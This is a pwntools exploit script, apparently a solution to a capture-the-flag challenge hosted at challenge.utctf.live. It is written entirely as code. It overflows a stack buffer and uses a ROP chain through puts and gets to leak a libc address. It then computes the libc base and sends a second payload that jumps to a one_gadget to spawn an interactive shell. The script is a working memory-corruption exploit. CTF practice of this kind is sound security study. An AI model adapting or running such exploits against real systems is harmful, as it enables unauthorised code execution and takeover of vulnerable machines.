from pwn import *

gs = '''
b *main+247
continue
'''

elf = context.binary = ELF("./shellcode_patched")
libc = ELF("./libc.so.6")

def start():
    if args.REMOTE:
        return remote("challenge.utctf.live", 9009)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

pop_rdi = 0x0000000000400793

payload = b"".join([
    b"A"*48,
    p64(0x6010a8),
    b"A"*16,
    p64(pop_rdi),
    p64(elf.got.gets),
    p64(elf.plt.puts),
    p64(elf.sym.main)
])

io.recv()

io.sendline(payload)

io.recvuntil(b"A"*48)

leak_libc = u64(io.recvline().strip()[3:].ljust(8, b"\x00"))

print(f"Leak Libc: {hex(leak_libc)}")

libc.address = leak_libc - libc.sym._IO_gets

print(f"System: {hex(libc.sym.system)}")

io.recv()

one_gadget = [0x4527a, 0xf03a4, 0xf1247]

payload = b"".join([
    b"A"*48,
    p64(0x6010a8),
    b"A"*16,
    p64(libc.address + one_gadget[1])
])

io.sendline(payload)

io.interactive()
